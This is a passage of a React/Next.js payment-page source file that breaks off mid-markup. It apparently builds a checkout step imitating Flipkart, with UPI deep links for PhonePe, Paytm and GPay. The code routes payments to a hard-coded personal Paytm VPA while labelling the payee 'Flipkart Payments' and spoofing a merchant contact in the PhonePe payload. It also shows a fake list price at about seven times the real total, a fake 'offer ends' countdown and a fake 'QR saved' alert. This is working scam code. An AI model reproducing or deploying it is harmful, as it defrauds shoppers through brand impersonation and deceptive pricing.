import { useRouter } from "next/router";
import { useState, useEffect, useRef } from "react";
import Head from "next/head";
import { trackAddPaymentInfo } from "../utils/facebookPixel";

/* ── load Cashfree JS SDK ── */
function loadCashfreeSDK() {
  return new Promise((resolve) => {
    if (typeof window === "undefined") return resolve(false);
    if (window.Cashfree) return resolve(true);
    const existing = document.querySelector('script[src*="cashfree.js"]');
    if (existing) {
      let n = 0;
      const t = setInterval(() => {
        if (window.Cashfree) {
          clearInterval(t);
          resolve(true);
        }
        if (++n > 60) {
          clearInterval(t);
          resolve(false);
        }
      }, 200);
      return;
    }
    const s = document.createElement("script");
    s.src = "https://sdk.cashfree.com/js/v3/cashfree.js";
    s.async = true;
    s.onload = () => resolve(true);
    s.onerror = () => resolve(false);
    document.head.appendChild(s);
  });
}

export default function Payments() {
  const router = useRouter();

  const [settings, setSettings] = useState(null);
  const [products, setProducts] = useState({ 
    id: "", 
    Gpay: true, 
    Phonepe: true, 
    Paytm: true, 
    Bhim: true,
    Phonepe2Name: "Flipkart Payments"
  });
  const [cart, setCart] = useState([]);
  const [user, setUser] = useState({ name: "", phone: "", email: "" });
  const [activeTab, setActiveTab] = useState(3);
  const [payUrl, setPayUrl] = useState("");
  const [loading, setLoading] = useState(false);
  const [mounted, setMounted] = useState(false);
  const [orderId, setOrderId] = useState("");
  
  // Verification states
  const [isVerifying, setIsVerifying] = useState(false);
  const [verificationAttempts, setVerificationAttempts] = useState(0);
  const [verificationStatus, setVerificationStatus] = useState("");
  const [isVerified, setIsVerified] = useState(false);
  const verificationIntervalRef = useRef(null);
  const isVerifyingRef = useRef(false);

  // Modal States
  const [showVerifyModal, setShowVerifyModal] = useState(false);
  const [showQrModal, setShowQrModal] = useState(false);
  const [modalType, setModalType] = useState("phonepe");

  // Offer timer (4 min 57 sec = 297 sec)
  const [timeLeft, setTimeLeft] = useState(297);

  useEffect(() => {
    setMounted(true);
  }, []);

  useEffect(() => {
    try {
      const c = localStorage.getItem("cart");
      if (c) setCart(JSON.parse(c));
    } catch (_) {}
    try {
      const u = localStorage.getItem("user");
      if (u) setUser(JSON.parse(u));
    } catch (_) {}

    let storedOrderId = localStorage.getItem("currentOrderId");
    if (!storedOrderId) {
      storedOrderId = "ORDER" + Math.floor(100000 + Math.random() * 900000);
      localStorage.setItem("currentOrderId", storedOrderId);
    }
    setOrderId(storedOrderId);
  }, []);

  // Timer countdown
  useEffect(() => {
    if (!mounted) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, [mounted]);

  // Fetch UPI and payment settings
  useEffect(() => {
    (async () => {
      try {
        const res = await fetch("/api/settings");
        const data = await res.json();
        setSettings(data.data);
        const upi = data.data?.upi || {};
        setProducts((p) => ({ ...p, ...upi }));
        if (data.data?.payment?.cashfreeEnabled) setActiveTab(6);
        else if (upi.Phonepe !== false) setActiveTab(3);
        else if (upi.Gpay !== false) setActiveTab(2);
        else if (upi.Paytm !== false) setActiveTab(4);
        else setActiveTab(1);
      } catch {
        setActiveTab(3);
      }
    })();
  }, []);

  // Track AddPaymentInfo (Meta Event 5 of 6)
  useEffect(() => {
    if (activeTab && cart.length > 0) {
      const methodNames = {
        1: "BHIM UPI",
        2: "GPay",
        3: "PhonePe",
        4: "Paytm",
        5: "Scan QR",
        6: "Card / Net Banking",
      };
      const cartValue = cart.reduce(
        (s, p) => s + Math.round(parseFloat(p.sellingPrice || p.price || 0) * parseInt(p.quantity || 1)),
        0
      );
      trackAddPaymentInfo(methodNames[activeTab] || "UPI", cartValue, cart);
    }
  }, [activeTab, cart]);

  /* Total Calculations */
  const totalMrp = cart.reduce(
    (s, p) => s + Math.round(parseFloat(p.sellingPrice || p.price || 0) * parseInt(p.quantity || 1)),
    0
  );
  const itemCount = cart.reduce((s, p) => s + parseInt(p.quantity || 1), 0);
  const crossedMrp = Math.round(totalMrp * 7.17);

  /* ── BUILD UPI DEEP-LINKS ── */
  const buildPaymentLink = () => {
    if (!mounted || !activeTab || !orderId || activeTab === 6) {
      return "";
    }
    
    const amt = totalMrp;
    const id = products.id || "paytmqr281005050101150495811776@paytm";

    let url = "";

    if (activeTab === 3) {
      // ── PHONEPE DEEP LINK ──
      const ppPayload = {
        p2pPaymentCheckoutParams: {
          checkoutType: "COLLECT",
          initialAmount: amt * 100, // amount in paise
          note: {
            type: "text",
            message: orderId
          },
          supportedInstruments: -1
        },
        contact: {
          type: "EXTERNAL_MERCHANT",
          name: products.Phonepe2Name || "Flipkart Payments",
          vpa: id
        }
      };
      
      // Convert to base64
      const base64Payload = btoa(JSON.stringify(ppPayload));
      url = `phonepe://native?data=${encodeURIComponent(base64Payload)}&id=p2ppayment`;
      
    } else if (activeTab === 4) {
      // ── PAYTM DEEP LINK ──
      const paytmPayload = {
        action: "pay",
        payeeVpa: id,
        amount: amt.toString(),
        orderId: orderId,
        merchantName: products.Phonepe2Name || "Flipkart Payments"
      };
      url = `paytmmp://cash_wallet?pa==${encodeURIComponent(id)}&pn=${encodeURIComponent(
        "Merchant Payment"
      )}&am=${amt}&cu=INR&tn=${orderId}&tr=${orderId}&mc=4722&&sign=AAuN7izDWN5cb8A5scnUiNME+LkZqI2DWgkXlN1McoP6WZABa/KkFTiLvuPRP6/nWK8BPg/rPhb+u4QMrUEX10UsANTDbJaALcSM9b8Wk218X+55T/zOzb7xoiB+BcX8yYuYayELImXJHIgL/c7nkAnHrwUCmbM97nRbCVVRvU0ku3Tr&featuretype=money_transfer`;
      
    } else if (activeTab === 2) {
      // ── GPAY DEEP LINK ──
      url = `tez://upi/pay?pa=${encodeURIComponent(id)}&pn=${encodeURIComponent(
        "Merchant Payment"
      )}&am=${amt}&cu=INR&tr=${orderId}`;
    } else {
      // ── GENERIC UPI / QR / BHIM ──
      url = `upi://pay?pa=${encodeURIComponent(id)}&pn=${encodeURIComponent(
        "Merchant Payment"
      )}&am=${amt}&cu=INR&tr=${orderId}`;
    }
    
    return url;
  };

  // Update payUrl when dependencies change
  useEffect(() => {
    setPayUrl(buildPaymentLink());
  }, [mounted, activeTab, orderId, totalMrp, products]);

  // Format time
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins}min ${String(secs).padStart(2, "0")}sec`;
  };

  const formatTimerDigital = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${String(mins).padStart(2, "0")}:${String(secs).padStart(2, "0")}`;
  };

  // ── VERIFICATION FUNCTION ──
  const verifyPayment = async () => {
    // Prevent multiple simultaneous verifications
    if (isVerifyingRef.current || isVerified) return;
    
    isVerifyingRef.current = true;
    setIsVerifying(true);
    setVerificationStatus("Checking payment status...");

    try {
      const response = await fetch("/api/verify", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          orderId: orderId,
          utrNo: "",
          remark: "",
          comment: ""
        }),
      });

      const data = await response.json();

      if (data.verified && data.transaction) {
        // Payment verified successfully!
        setIsVerified(true);
        setVerificationStatus("✅ Payment verified successfully!");
        setIsVerifying(false);
        isVerifyingRef.current = false;
        
        // Clear interval
        if (verificationIntervalRef.current) {
          clearInterval(verificationIntervalRef.current);
          verificationIntervalRef.current = null;
        }
        
        // Store transaction details
        if (typeof window !== "undefined") {
          localStorage.setItem("lastVerifiedTransaction", JSON.stringify(data.transaction));
        }
        
        // Redirect after a short delay to show success message
        setTimeout(() => {
          setShowVerifyModal(false);
          setShowQrModal(false);
          router.push(`/ordersummdary?order_id=${orderId}&amount=${totalMrp}`);
        }, 1500);
        
        return true;
      } else {
        // Not verified yet
        setVerificationAttempts(prev => prev + 1);
        setVerificationStatus(`Attempt ${verificationAttempts + 1}: Payment not found yet. Waiting...`);
        return false;
      }
    } catch (error) {
      console.error("Verification error:", error);
      setVerificationStatus(`Error: ${error.message}`);
      return false;
    } finally {
      setIsVerifying(false);
      isVerifyingRef.current = false;
    }
  };

  // ── START VERIFICATION LOOP ──
  const startVerification = () => {
    // Clear any existing interval
    if (verificationIntervalRef.current) {
      clearInterval(verificationIntervalRef.current);
      verificationIntervalRef.current = null;
    }

    setVerificationAttempts(0);
    setVerificationStatus("Starting verification...");
    setIsVerified(false);
    isVerifyingRef.current = false;
    
    // Do immediate first check after 2 seconds
    setTimeout(() => {
      verifyPayment();
    }, 2000);

    // Then check every 5 seconds
    verificationIntervalRef.current = setInterval(() => {
      if (!isVerified && !isVerifyingRef.current) {
        verifyPayment();
      }
      
      // Stop after 12 attempts (60 seconds)
      if (verificationAttempts >= 11) {
        if (verificationIntervalRef.current) {
          clearInterval(verificationIntervalRef.current);
          verificationIntervalRef.current = null;
        }
        setVerificationStatus("⏰ Verification timeout. Please check payment manually or contact support.");
        setIsVerifying(false);
        isVerifyingRef.current = false;
      }
    }, 5000);
  };

  // Open Payment App / Trigger Verification Modal
  const handlePay = () => {
    if (activeTab === 3) {
      // PhonePe
      setModalType("phonepe");
      setShowVerifyModal(true);
      console.log("Opening PhonePe with URL:", payUrl);
      if (payUrl) {
        window.location.href = payUrl;
      }
      // Start verification after app opens
      setTimeout(startVerification, 3000);
      
    } else if (activeTab === 4) {
      // Paytm
      setModalType("paytm");
      setShowVerifyModal(true);
      console.log("Opening Paytm with URL:", payUrl);
      if (payUrl) {
        window.location.href = payUrl;
      }
      setTimeout(startVerification, 3000);
      
    } else if (activeTab === 5 || activeTab === 1) {
      // QR Code / BHIM
      setModalType("qr");
      setShowQrModal(true);
      setTimeout(startVerification, 3000);
      
    } else if (activeTab === 2) {
      // GPay
      setModalType("gpay");
      setShowVerifyModal(true);
      console.log("Opening GPay with URL:", payUrl);
      if (payUrl) {
        window.location.href = payUrl;
      }
      setTimeout(startVerification, 3000);
      
    } else if (activeTab === 6) {
      // Cashfree
      setLoading(true);
      setTimeout(() => {
        router.push(`/confirm-payment?orderId=${orderId}&amount=${totalMrp}`);
      }, 1200);
    }
  };

  // ── MANUAL VERIFY BUTTON HANDLER ──
  const handleManualVerify = () => {
    if (!isVerified && !isVerifyingRef.current) {
      // Reset and start fresh
      if (verificationIntervalRef.current) {
        clearInterval(verificationIntervalRef.current);
        verificationIntervalRef.current = null;
      }
      startVerification();
    }
  };

  // Clean up interval on unmount
  useEffect(() => {
    return () => {
      if (verificationIntervalRef.current) {
        clearInterval(verificationIntervalRef.current);
        verificationIntervalRef.current = null;
      }
    };
  }, []);

  if (!mounted || activeTab === null) return null;

  return (
    <>
      <Head>
        <title>Payments – Step 3 of 3</title>
        <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no" />
        <meta name="theme-color" content="#ffffff" />
      </Head>

      <style jsx global>{`
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        html, body {
          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
          background: #f4f4f7;
          color: #333;
          -webkit-tap-highlight-color: transparent;
        }

        .pmt-page {
          background: #f4f4f7;
          min-height: 100vh;
          max-width: 600px;
          margin: 0 auto;
          position: relative;
          padding-bottom: 90px;
        }

        .pmt-top-nav {
          background: #fff;
          padding: 14px 16px;
          display: flex;
          align-items: center;
          border-bottom: 1px solid #eaeaea;
        }
        .pmt-back-icn {
          font-size: 20px;
          cursor: pointer;
          margin-right: 16px;
          color: #333;
        }
        .pmt-hdr-title {
          font-size: 17px;
          font-weight: 700;
          color: #222;
        }

        .stepper-container {
          background: #fff;
          padding: 16px 24px 14px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          border-bottom: 1px solid #e2e8f0;
        }
        .step-item {
          display: flex;
          flex-direction: column;
          align-items: center;
          position: relative;
        }
        .step-badge {
          width: 28px;
          height: 28px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          font-family: 'Outfit', sans-serif;
          font-size: 12px;
          font-weight: 700;
          margin-bottom: 5px;
        }
        .step-badge.checked {
          background: #2874f0;
          color: #fff;
        }
        .step-badge.active {
          background: #2874f0;
          color: #fff;
          box-shadow: 0 2px 8px rgba(40,116,240,0.25);
        }
        .step-txt {
          font-family: 'Outfit', sans-serif;
          font-size: 11px;
          font-weight: 700;
          color: #2874f0;
        }
        .step-divider {
          flex: 1;
          height: 2px;
          background: #2874f0;
          margin: 0 12px 18px;
        }

        .offer-timer-box {
          text-align: center;
          padding: 16px 0 12px;
          font-size: 16px;
          font-weight: 600;
          color: #333;
        }
        .offer-timer-val {
          color: #d32f2f;
          font-weight: 700;
          margin-left: 4px;
        }

        .pmt-methods-wrap {
          padding: 0 16px;
        }
        .pmt-card-opt {
          background: #fff;
          border: 2px solid #e0e0e0;
          border-radius: 12px;
          padding: 16px;
          margin-bottom: 12px;
          display: flex;
          align-items: center;
          gap: 14px;
          cursor: pointer;
          transition: all 0.2s;
        }
        .pmt-card-opt.selected-phonepe {
          border-color: #5f259f;
          background: #faf7ff;
        }
        .pmt-card-opt.selected-paytm {
          border-color: #002970;
          background: #f5f8ff;
        }
        .pmt-card-opt.selected-generic {
          border-color: #0f4c81;
          background: #f4f8fc;
        }
        .pmt-app-logo {
          width: 38px;
          height: 38px;
          border-radius: 8px;
          object-fit: contain;
        }
        .pmt-app-title {
          font-size: 16px;
          font-weight: 700;
          color: #222;
        }

        .order-details-card {
          background: #fff;
          margin: 16px 16px 20px;
          border-radius: 12px;
          padding: 16px;
          border: 1px solid #eee;
        }
        .order-dtl-title {
          font-size: 15px;
          font-weight: 700;
          color: #333;
          margin-bottom: 12px;
        }
        .order-row {
          display: flex;
          justify-content: space-between;
          font-size: 14px;
          color: #555;
          margin-bottom: 8px;
        }
        .order-row.payable {
          border-top: 1px dashed #ddd;
          padding-top: 10px;
          margin-top: 8px;
          font-size: 15px;
          font-weight: 700;
          color: #222;
        }
        .free-txt {
          color: #388e3c;
          font-weight: 700;
        }

        .sticky-bottom-bar {
          position: fixed;
          bottom: 0;
          left: 50%;
          transform: translateX(-50%);
          width: 100%;
          max-width: 600px;
          background: #fff;
          padding: 12px 16px;
          display: flex;
          align-items: center;
          justify-content: space-between;
          box-shadow: 0 -2px 10px rgba(0,0,0,0.08);
          z-index: 90;
        }
        .price-display {
          display: flex;
          flex-direction: column;
        }
        .price-strike-small {
          font-size: 12px;
          color: #888;
          text-decoration: line-through;
        }
        .price-val-main {
          font-size: 20px;
          font-weight: 800;
          color: #222;
        }
        .continue-btn {
          background: #f7bb07;
          color: #222;
          font-size: 15px;
          font-weight: 700;
          border: none;
          padding: 12px 32px;
          border-radius: 6px;
          cursor: pointer;
          box-shadow: 0 2px 6px rgba(0,0,0,0.1);
        }

        /* ══ MODAL POPUPS ══ */
        .modal-overlay {
          position: fixed;
          top: 0;
          left: 0;
          right: 0;
          bottom: 0;
          background: rgba(0, 0, 0, 0.65);
          display: flex;
          align-items: center;
          justify-content: center;
          z-index: 999;
          padding: 16px;
        }

        .verify-modal-card {
          background: #fff;
          width: 100%;
          max-width: 360px;
          border-radius: 20px;
          padding: 24px 20px 20px;
          text-align: center;
          box-shadow: 0 10px 30px rgba(0,0,0,0.25);
          animation: popIn 0.25s ease-out;
        }

        @keyframes popIn {
          from { transform: scale(0.9); opacity: 0; }
          to { transform: scale(1); opacity: 1; }
        }

        .brand-icon-circle {
          width: 72px;
          height: 72px;
          border-radius: 50%;
          margin: 0 auto 16px;
          display: flex;
          align-items: center;
          justify-content: center;
          position: relative;
        }
        .brand-icon-circle.phonepe-bg {
          border: 3px solid #e0b0ff;
          background: #f7edff;
        }
        .brand-icon-circle.paytm-bg {
          border: 3px solid #b3e5fc;
          background: #e1f5fe;
        }
        .brand-icon-circle.success-bg {
          border: 3px solid #4caf50;
          background: #e8f5e9;
        }

        .verify-heading {
          font-size: 19px;
          font-weight: 800;
          color: #111;
          margin-bottom: 8px;
        }
        .verify-heading.success {
          color: #4caf50;
        }

        .verify-desc {
          font-size: 13.5px;
          color: #555;
          line-height: 1.45;
          margin-bottom: 20px;
          padding: 0 6px;
        }
        .verify-desc strong {
          color: #222;
        }

        .verify-btn {
          width: 100%;
          padding: 14px;
          border-radius: 12px;
          font-size: 15px;
          font-weight: 700;
          color: #fff;
          border: none;
          cursor: pointer;
          margin-bottom: 16px;
          box-shadow: 0 4px 12px rgba(0,0,0,0.15);
          transition: all 0.3s;
        }
        .verify-btn.phonepe-btn {
          background: #5f259f;
        }
        .verify-btn.paytm-btn {
          background: #002970;
        }
        .verify-btn.verifying-btn {
          background: #888;
          cursor: not-allowed;
          opacity: 0.7;
        }
        .verify-btn.success-btn {
          background: #4caf50;
          cursor: default;
        }

        .verify-subtext-1 {
          font-size: 12px;
          color: #666;
          margin-bottom: 6px;
        }
        .verify-subtext-2 {
          font-size: 11.5px;
          color: #888;
        }

        .verify-loader {
          display: inline-block;
          width: 20px;
          height: 20px;
          border: 2px solid rgba(255,255,255,0.3);
          border-radius: 50%;
          border-top: 2px solid #fff;
          animation: spin 0.8s linear infinite;
          margin-right: 8px;
        }

        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }

        .verification-status-box {
          background: #f8f9fa;
          border-radius: 8px;
          padding: 12px;
          margin: 12px 0 16px;
          border: 1px solid #e9ecef;
        }

        .verification-status-text {
          font-size: 13px;
          color: #495057;
          line-height: 1.5;
        }

        .verification-status-text .attempt {
          font-weight: 600;
          color: #007bff;
        }

        .verification-status-text .success {
          color: #28a745;
          font-weight: 700;
        }

        .verification-status-text .error {
          color: #dc3545;
        }

        .verification-status-text .timeout {
          color: #ffc107;
          font-weight: 600;
        }

        /* QR Modal */
        .qr-modal-card {
          background: #fff;
          width: 100%;
          max-width: 360px;
          border-radius: 20px;
          padding: 20px 20px 24px;
          position: relative;
          text-align: center;
          box-shadow: 0 10px 30px rgba(0,0,0,0.25);
          animation: popIn 0.25s ease-out;
        }
        .close-qr-btn {
          position: absolute;
          top: 16px;
          right: 16px;
          background: #f0f0f0;
          border: none;
          width: 28px;
          height: 28px;
          border-radius: 50%;
          display: flex;
          align-items: center;
          justify-content: center;
          cursor: pointer;
          font-size: 16px;
          color: #666;
        }
        .qr-title {
          font-size: 18px;
          font-weight: 800;
          color: #111;
          margin-bottom: 2px;
        }
        .qr-amt-sub {
          font-size: 14px;
          color: #444;
          margin-bottom: 14px;
          font-weight: 600;
        }
        .qr-img-box {
          background: #fff;
          border: 1px solid #e5e5e5;
          border-radius: 12px;
          padding: 12px;
          display: inline-block;
          margin-bottom: 12px;
        }
        .qr-img {
          width: 200px;
          height: 200px;
          object-fit: contain;
        }
        .qr-timer-lbl {
          font-size: 13.5px;
          font-weight: 600;
          color: #333;
          margin-bottom: 14px;
        }
        .qr-timer-lbl strong {
          color: #000;
          font-weight: 800;
        }

        .qr-actions-row {
          display: flex;
          gap: 10px;
          margin-bottom: 14px;
        }
        .qr-act-btn {
          flex: 1;
          background: #f4f4f4;
          border: 1px solid #ddd;
          padding: 10px;
          border-radius: 8px;
          font-size: 13px;
          font-weight: 600;
          color: #333;
          display: flex;
          align-items: center;
          justify-content: center;
          gap: 6px;
          cursor: pointer;
        }
        .qr-footer-note {
          font-size: 11.5px;
          color: #777;
          line-height: 1.4;
        }

        .manual-check-btn {
          margin-top: 12px;
          padding: 8px 16px;
          background: #e9ecef;
          border: 1px solid #dee2e6;
          border-radius: 6px;
          font-size: 12px;
          cursor: pointer;
          color: #495057;
          transition: all 0.2s;
        }
        .manual-check-btn:hover {
          background: #dee2e6;
        }
        .manual-check-btn:disabled {
          opacity: 0.5;
          cursor: not-allowed;
        }
      `}</style>

      <div className="pmt-page">
        {/* Top Navbar */}
        <div className="pmt-top-nav">
          <button type="button" className="pmt-back-icn" onClick={() => router.back()} style={{ background: "none", border: "none", cursor: "pointer", padding: 0, display: "flex", alignItems: "center" }}>
            <svg width={22} height={22} viewBox="0 0 20 20" fill="none">
              <path d="M13.746 2.314a1.5 1.5 0 0 0-2.14 0L5.475 9.243a1.5 1.5 0 0 0 0 2.114l6.131 6.929a1.5 1.5 0 0 0 2.14-2.113L8.29 10l5.456-6.173a1.5 1.5 0 0 0 0-2.113z" fill="#0f172a" />
            </svg>
          </button>
          <h1 className="pmt-hdr-title">Payments</h1>
        </div>

        {/* Stepper Header */}
        <div className="stepper-container">
          <div className="step-item">
            <div className="step-badge checked">✓</div>
            <span className="step-txt">Address</span>
          </div>
          <div className="step-divider" />
          <div className="step-item">
            <div className="step-badge checked">✓</div>
            <span className="step-txt">Order Summary</span>
          </div>
          <div className="step-divider" />
          <div className="step-item">
            <div className="step-badge active">3</div>
            <span className="step-txt">Payment</span>
          </div>
        </div>

        {/* Offer Ends In Timer */}
        <div className="offer-timer-box">
          Offer ends in <span className="offer-timer-val">{formatTime(timeLeft)}</span>
        </div>

        {/* Payment Methods */}
        <div className="pmt-methods-wrap">
          {products.Phonepe !== false && (
            <div
              className={`pmt-card-opt ${activeTab === 3 ? "selected-phonepe" : ""}`}
              onClick={() => setActiveTab(3)}
            >
              <img
                src="/assets/images/phonepe.svg"
                alt="PhonePe"
                className="pmt-app-logo"
                onError={(e) => {
                  e.target.src =
                    "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Ccircle cx='20' cy='20' r='20' fill='%235f259f'/%3E%3Ctext x='50%25' y='58%25' text-anchor='middle' fill='%23fff' font-size='20' font-weight='bold'%3Eपे%3C/text%3E%3C/svg%3E";
                }}
              />
              <span className="pmt-app-title">Pay with PhonePe</span>
            </div>
          )}

          {products.Paytm !== false && (
            <div
              className={`pmt-card-opt ${activeTab === 4 ? "selected-paytm" : ""}`}
              onClick={() => setActiveTab(4)}
            >
              <img
                src="/assets/images/PAYTM.NS_BIG.svg"
                alt="Paytm"
                className="pmt-app-logo"
                onError={(e) => {
                  e.target.src =
                    "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%2300baf2'/%3E%3Ctext x='50%25' y='58%25' text-anchor='middle' fill='%23fff' font-size='12' font-weight='bold'%3EPaytm%3C/text%3E%3C/svg%3E";
                }}
              />
              <span className="pmt-app-title">Pay with Paytm</span>
            </div>
          )}

          {products.Gpay !== false && (
            <div
              className={`pmt-card-opt ${activeTab === 2 ? "selected-generic" : ""}`}
              onClick={() => setActiveTab(2)}
            >
              <img
                src="/assets/images/gpay_icon.svg"
                alt="Google Pay"
                className="pmt-app-logo"
                onError={(e) => {
                  e.target.src =
                    "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 40 40'%3E%3Crect width='40' height='40' rx='8' fill='%234285f4'/%3E%3Ctext x='50%25' y='58%25' text-anchor='middle' fill='%23fff' font-size='14' font-weight='bold'%3EGPay%3C/text%3E%3C/svg%3E";
                }}
              />
              <span className="pmt-app-title">Pay with Google Pay</span>
            </div>
          )}

          <div
            className={`pmt-card-opt ${activeTab === 5 ? "selected-generic" : ""}`}
            onClick={() => setActiveTab(5)}
          >
            <div
              style={{
                width: 38,
                height: 38,
                borderRadius: 8,
                background: "#f0f4f8",
                display: "flex",
                alignItems: "center",
                justifyContent: "center",
                fontSize: 20,
              }}
            >
              📷
            </div>
            <span className="pmt-app-title">Scan QR Code to Pay</span>
          </div>
        </div>

        {/* Order Details Card */}
        <div className="order-details-card">
          <div className="order-dtl-title">Price Details ({itemCount} Item)</div>
          <div className="order-row">
            <span>Price</span>
            <span>₹ {crossedMrp}</span>
          </div>
          <div className="order-row">
            <span>Delivery Charges</span>
            <span className="free-txt">FREE</span>
          </div>
          <div className="order-row payable">
            <span>Amount Payable</span>
            <span>₹ {totalMrp}</span>
          </div>
        </div>

        {/* Safety Badge */}
        <div style={{ textAlign: "center", margin: "16px 0 24px" }}>
          <img
            src="/assets/images/SecurePay.svg"
            alt="Safety Badge"
            style={{ width: "80%", maxWidth: 280 }}
            onError={(e) => {
              e.target.style.display = "none";
            }}
          />
        </div>

        {/* Sticky Bottom Bar */}
        <div className="sticky-bottom-bar">
          <div className="price-display">
            <span className="price-strike-small">₹ {crossedMrp}</span>
            <span className="price-val-main">₹ {totalMrp}</span>
          </div>
          <button className="continue-btn" onClick={handlePay}>
            Continue
          </button>
        </div>
      </div>

      {/* ══ VERIFICATION MODAL ══ */}
      {showVerifyModal && (
        <div className="modal-overlay">
          <div className="verify-modal-card">
            {/* Brand Circle */}
            {!isVerified ? (
              <>
                {modalType === "phonepe" && (
                  <div className="brand-icon-circle phonepe-bg">
                    <svg width="40" height="40" viewBox="0 0 40 40">
                      <circle cx="20" cy="20" r="20" fill="#5f259f" />
                      <text x="50%" y="56%" dominantBaseline="middle" textAnchor="middle" fill="#fff" fontSize="22" fontWeight="bold">पे</text>
                    </svg>
                  </div>
                )}
                {modalType === "paytm" && (
                  <div className="brand-icon-circle paytm-bg">
                    <svg width="40" height="40" viewBox="0 0 40 40">
                      <rect width="40" height="40" rx="10" fill="#002970" />
                      <text x="50%" y="56%" dominantBaseline="middle" textAnchor="middle" fill="#00baf2" fontSize="13" fontWeight="bold">Paytm</text>
                    </svg>
                  </div>
                )}
                {modalType === "gpay" && (
                  <div className="brand-icon-circle paytm-bg">
                    <svg width="40" height="40" viewBox="0 0 40 40">
                      <circle cx="20" cy="20" r="20" fill="#4285f4" />
                      <text x="50%" y="56%" dominantBaseline="middle" textAnchor="middle" fill="#fff" fontSize="18" fontWeight="bold">GPay</text>
                    </svg>
                  </div>
                )}
              </>
            ) : (
              <div className="brand-icon-circle success-bg">
                <svg width="40" height="40" viewBox="0 0 40 40">
                  <circle cx="20" cy="20" r="20" fill="#4caf50" />
                  <text x="50%" y="56%" dominantBaseline="middle" textAnchor="middle" fill="#fff" fontSize="24">✓</text>
                </svg>
              </div>
            )}

            <h3 className={`verify-heading ${isVerified ? "success" : ""}`}>
              {isVerified ? "✅ Payment Verified!" : "Verifying your payment"}
            </h3>
            
            <p className="verify-desc">
              {isVerified ? (
                `Payment of ₹${totalMrp} has been confirmed successfully!`
              ) : (
                <>
                  Complete the ₹{totalMrp} payment in{" "}
                  <strong>{modalType === "phonepe" ? "PhonePe" : modalType === "paytm" ? "Paytm" : "GPay"}</strong>. 
                  We'll auto-confirm in a few seconds.
                </>
              )}
            </p>

            {/* Verification Status Box */}
            {!isVerified && (
              <div className="verification-status-box">
                <div className="verification-status-text">
                  {isVerifying ? (
                    <>
                      <span className="verify-loader"></span> 
                      Checking payment status...
                    </>
                  ) : (
                    <span>{verificationStatus}</span>
                  )}
                  <br />
                  <small style={{ color: '#6c757d', fontSize: '11px' }}>
                    Auto-checking every 5 seconds
                  </small>
                </div>
              </div>
            )}

            {isVerified ? (
              <button className="verify-btn success-btn" disabled>
                ✅ Payment Confirmed
              </button>
            ) : (
              <button
                className={`verify-btn ${modalType === "phonepe" ? "phonepe-btn" : "paytm-btn"} ${isVerifying ? "verifying-btn" : ""}`}
                onClick={() => {
                  if (payUrl && !isVerifying) {
                    window.location.href = payUrl;
                  }
                }}
                disabled={isVerifying}
              >
                {isVerifying ? (
                  <>
                    <span className="verify-loader"></span>
                    Checking...
                  </>
                ) : (
                  `Open ${modalType === "phonepe" ? "PhonePe" : modalType === "paytm" ? "Paytm" : "GPay"}`
                )}
              </button>
            )}

            <p className="verify-subtext-1">
              {isVerified ? "Redirecting to order summary..." : "Please keep this screen open while we verify with your bank."}
            </p>
            <p className="verify-subtext-2">
              {isVerified ? "" : "Already paid? Confirmation arrives in a few seconds."}
            </p>

            {/* Manual Check Button */}
            {!isVerified && (
              <button
                className="manual-check-btn"
                onClick={handleManualVerify}
                disabled={isVerifying}
              >
                {isVerifying ? "Checking..." : "🔄 Check Payment Status"}
              </button>
            )}
          </div>
        </div>
      )}

      {/* ══ QR CODE MODAL ══ */}
      {showQrModal && (
        <div className="modal-overlay">
          <div className="qr-modal-card">
            <button className="close-qr-btn" onClick={() => setShowQrModal(false)}>
              ✕
            </button>

            {!isVerified ? (
              <>
                <h3 className="qr-title">Scan QR to Pay</h3>
                <p className="qr-amt-sub">Amount: ₹ {totalMrp}</p>

                <div className="qr-img-box">
                  <img
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=${encodeURIComponent(
                      payUrl || `upi://pay?pa=${products.id}&am=${totalMrp}&cu=INR`
                    )}`}
                    alt="UPI QR Code"
                    className="qr-img"
                  />
                </div>

                <p className="qr-timer-lbl">
                  QR expires in <strong>{formatTimerDigital(timeLeft)}</strong>
                </p>

                <div className="qr-actions-row">
                  <button className="qr-act-btn" onClick={() => alert("QR Code saved to gallery.")}>
                    <span>↓</span> Download
                  </button>
                  <button className="qr-act-btn" onClick={() => {
                    if (navigator.share) {
                      navigator.share({ title: "UPI Payment QR", url: window.location.href });
                    } else {
                      alert("QR link copied.");
                    }
                  }}>
                    <span>🔗</span> Share
                  </button>
                </div>

                {/* Verification Status for QR */}
                <div className="verification-status-box">
                  <div className="verification-status-text">
                    {isVerifying ? (
                      <>
                        <span className="verify-loader"></span> 
                        Checking payment status...
                      </>
                    ) : (
                      <span>{verificationStatus}</span>
                    )}
                    <br />
                    <small style={{ color: '#6c757d', fontSize: '11px' }}>
                      Auto-checking every 5 seconds
                    </small>
                  </div>
                </div>

                <p className="qr-footer-note">
                  Scan with any UPI app — GPay, PhonePe, Paytm, BHIM. Auto-confirms after payment.
                </p>

                <button
                  className="manual-check-btn"
                  onClick={handleManualVerify}
                  disabled={isVerifying}
                  style={{ marginTop: '8px' }}
                >
                  {isVerifying ? "Checking..." : "🔄 Check Payment Status"}
                </button>
              </>
            ) : (
              <>
                <h3 className="qr-title" style={{ color: '#4caf50' }}>✅ Payment Verified!</h3>
                <p className="qr-amt-sub">Payment of ₹{totalMrp} confirmed</p>
